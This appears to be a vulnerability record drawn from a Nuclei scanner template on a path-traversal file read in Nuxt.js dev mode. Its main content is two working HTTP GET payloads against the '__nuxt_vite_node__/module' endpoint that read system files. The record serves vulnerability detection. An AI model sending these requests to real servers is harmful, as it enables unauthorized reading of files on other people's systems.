# Vulnerability: Semi Arbitrary File Read in Dev Mode - Nuxt.js
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`nuxt-js-semi-lfi.yaml`)

## Description
Arbitrary File Read in Dev Mode in Nuxt.js

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/__nuxt_vite_node__/module//bin/passwd
GET {{BaseURL}}/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe
```

